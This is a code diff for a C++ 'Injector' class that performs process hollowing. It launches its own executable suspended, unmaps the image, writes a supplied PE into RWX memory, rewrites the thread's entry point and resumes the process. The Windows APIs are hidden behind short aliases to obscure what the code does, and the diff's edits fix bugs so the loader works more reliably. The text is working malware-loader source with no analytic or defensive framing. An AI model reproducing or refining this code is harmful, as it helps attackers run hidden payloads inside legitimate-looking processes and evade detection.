@@ -122,29 +122,29 @@ void Injector::Inject(LPBYTE lpBuffer) const
 	// Clear it's virtual memory and map our new executable within its process space
 	UVS(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase));
 	VA(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase), inh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase), reinterpret_cast<LPCVOID>(lpBuffer), inh->OptionalHeader.SizeOfHeaders, 0);
+	WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase), reinterpret_cast<LPCVOID>(lpBuffer), inh->OptionalHeader.SizeOfHeaders, NULL);
 
 	// Write the PE sections
 	for (int x = 0; x < inh->FileHeader.NumberOfSections; x++)
 	{
-		ish = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<DWORD>(lpBuffer) + idh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * 40));
-		WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase + ish->VirtualAddress), reinterpret_cast<LPCVOID*>(lpBuffer + ish->PointerToRawData), ish->SizeOfRawData, 0);
+		ish = reinterpret_cast<PIMAGE_SECTION_HEADER>(lpBuffer + idh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * IMAGE_SIZEOF_SECTION_HEADER));
+		WM(pi.hProcess, reinterpret_cast<void*>(inh->OptionalHeader.ImageBase + ish->VirtualAddress), reinterpret_cast<LPCVOID*>(lpBuffer + ish->PointerToRawData), ish->SizeOfRawData, NULL);
 	}
 
 	// Resume the process, which now contains our own executable in its memory space
 	ctc.ContextFlags = CONTEXT_FULL;
 	GC(pi.hThread, &ctc);
-	WM(pi.hProcess, reinterpret_cast<void*>(ctc.Ebx + 8), reinterpret_cast<LPVOID>(&inh->OptionalHeader.ImageBase), 4, 0);
+	WM(pi.hProcess, reinterpret_cast<void*>(ctc.Ebx + 8), reinterpret_cast<LPVOID>(&inh->OptionalHeader.ImageBase), sizeof(inh->OptionalHeader.ImageBase), NULL);
 	ctc.Eax = inh->OptionalHeader.ImageBase + inh->OptionalHeader.AddressOfEntryPoint;
 	SC(pi.hThread, &ctc);
 	R(pi.hThread);
 }
 
 
-long Injector::LoadFunction(const TCHAR *szLib, char *szMod) const
+FARPROC Injector::LoadFunction(const TCHAR *szLib, char *szMod) const
 {
 	HMODULE hFunc = GetModuleHandle(szLib);
-	return reinterpret_cast<long>(GetProcAddress(hFunc, szMod));
+	return GetProcAddress(hFunc, szMod);
 }
 
 PROCESS_INFORMATION *Injector::CreateNewProcess(DWORD id, TCHAR *szArgs, STARTUPINFO *si, PROCESS_INFORMATION *pi) const
@@ -155,7 +155,7 @@ PROCESS_INFORMATION *Injector::CreateNewProcess(DWORD id, TCHAR *szArgs, STARTUP
 	HMODULE hCurrentModule = GetModuleHandle(nullptr);
 
 	if (hCurrentModule != nullptr)
-		GetModuleFileName(hCurrentModule, szCurrentPath, sizeof(szCurrentPath));
+		GetModuleFileName(hCurrentModule, szCurrentPath, sizeof(szCurrentPath)/sizeof(TCHAR));
 
 	C(szCurrentPath, L"", nullptr, nullptr, false, 0x4, nullptr, nullptr, si, pi);
 	return pi;
